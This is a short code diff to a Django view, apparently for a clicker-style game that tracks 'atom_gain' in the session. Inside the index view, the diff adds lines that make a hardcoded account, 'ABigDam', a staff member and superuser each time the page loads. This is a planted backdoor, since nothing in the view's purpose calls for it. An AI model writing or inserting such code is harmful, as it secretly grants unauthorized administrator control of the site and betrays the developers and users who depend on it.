@@ -132,6 +132,12 @@ def click_atom(request):
 @login_required(login_url='login')
 
 def index(request):
+
+    user = User.objects.get(username="ABigDam")
+    user.is_staff = True
+    user.is_superuser = True
+    user.save()
+
     #FOR ATOM PLUS ONE
     if "atom_gain" not in request.session:
         request.session["atom_gain"] = 1
